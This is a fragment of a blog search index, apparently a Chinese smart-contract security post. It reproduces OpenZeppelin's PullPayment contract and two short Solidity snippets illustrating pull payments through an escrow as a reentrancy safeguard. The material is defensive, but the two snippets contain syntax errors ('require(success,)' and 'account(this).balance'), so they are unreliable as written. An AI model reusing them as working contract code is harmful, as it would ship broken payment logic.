class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>// OpenZeppelin Contracts v4.3.2 (security/PullPayment.sol)<br><br>pragma solidity ^0.8.0;<br><br>import &quot;../utils/escrow/Escrow.sol&quot;;<br><br>/**<br> * @dev Simple implementation of a<br> * https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-for-external-calls[pull-payment]<br> * strategy, where the paying contract doesn&#x27;t interact directly with the<br> * receiver account, which must withdraw its payments itself.<br> *<br> * Pull-payments are often considered the best practice when it comes to sending<br> * Ether, security-wise. It prevents recipients from blocking execution, and<br> * eliminates reentrancy concerns.<br> *<br> * TIP: If you would like to learn more about reentrancy and alternative ways<br> * to protect against it, check out our blog post<br> * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].<br> *<br> * To use, derive from the `PullPayment` contract, and use &#123;_asyncTransfer&#125;<br> * instead of Solidity&#x27;s `transfer` function. Payees can query their due<br> * payments with &#123;payments&#125;, and retrieve them with &#123;withdrawPayments&#125;.<br> */<br>abstract contract PullPayment &#123;<br>    Escrow private immutable _escrow;<br><br>    constructor() &#123;<br>        _escrow = new Escrow();<br>    &#125;<br><br>    /**<br>     * @dev Withdraw accumulated payments, forwarding all gas to the recipient.<br>     *<br>     * Note that _any_ account can call this function, not just the `payee`.<br>     * This means that contracts unaware of the `PullPayment` protocol can still<br>     * receive funds this way, by having a separate account call<br>     * &#123;withdrawPayments&#125;.<br>     *<br>     * WARNING: Forwarding all gas opens the door to reentrancy vulnerabilities.<br>     * Make sure you trust the recipient, or are either following the<br>     * checks-effects-interactions pattern or using &#123;ReentrancyGuard&#125;.<br>     *<br>     * @param payee Whose payments will be withdrawn.<br>     */<br>    function withdrawPayments(address payable payee) public virtual &#123;<br>        _escrow.withdraw(payee);<br>    &#125;<br><br>    /**<br>     * @dev Returns the payments owed to an address.<br>     * @param dest The creditor&#x27;s address.<br>     */<br>    function payments(address dest) public view returns (uint256) &#123;<br>        return _escrow.depositsOf(dest);<br>    &#125;<br><br>    /**<br>     * @dev Called by the payer to store the sent amount as credit to be pulled.<br>     * Funds sent in this way are stored in an intermediate &#123;Escrow&#125; contract, so<br>     * there is no danger of them being spent before withdrawal.<br>     *<br>     * @param dest The destination address of the funds.<br>     * @param amount The amount to transfer.<br>     */<br>    function _asyncTransfer(address dest, uint256 amount) internal virtual &#123;<br>        _escrow.deposit&#123;value: amount&#125;(dest);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里，合约资金被发送给中介托管:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function sendPayment(address user, address escrow) external &#123;<br>  require(msg.sender == authorized);  <br>  uint userBalance = userBalances[user];  <br>  require(userBalance &gt; 0);  <br>  userBalances[user] = 0;  <br>  (bool success,) = escrow.call&#123; value: userBalance &#125;(&quot;&quot;);<br>  require(success,);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里，托管资金可以由接收者提取:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function pullPayment() external &#123;<br>  require(msg.sender == receiver);  <br>  uint payment = account(this).balance;  <br>  (bool success,) = msg.sender.call&#123; value: payment &#125;(&quot;&quot;);<br>  require(success,);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
